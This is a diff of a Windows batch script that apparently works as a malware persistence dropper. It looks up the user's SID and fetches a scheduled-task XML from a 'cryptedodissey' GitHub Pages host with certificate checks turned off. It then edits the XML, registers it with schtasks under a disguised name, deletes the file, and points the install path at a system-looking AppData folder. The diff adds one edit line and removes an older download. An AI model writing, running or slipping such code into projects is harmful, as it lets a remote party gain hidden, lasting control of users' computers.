@@ -11,11 +11,9 @@ Set enviroment=C:\Windows
 FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
 curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
 powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
-
-curl -k %proxy% "https://api.github.com/repos/cryptedodissey/cryptedodissey.github.io/contents/Task.xml > "%SID%.xml"
-powershell -Command "(gc %SID%.xml) -replace 'SID', %SID% | Out-File -encoding ASCII %SID%.xml"
 
 rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
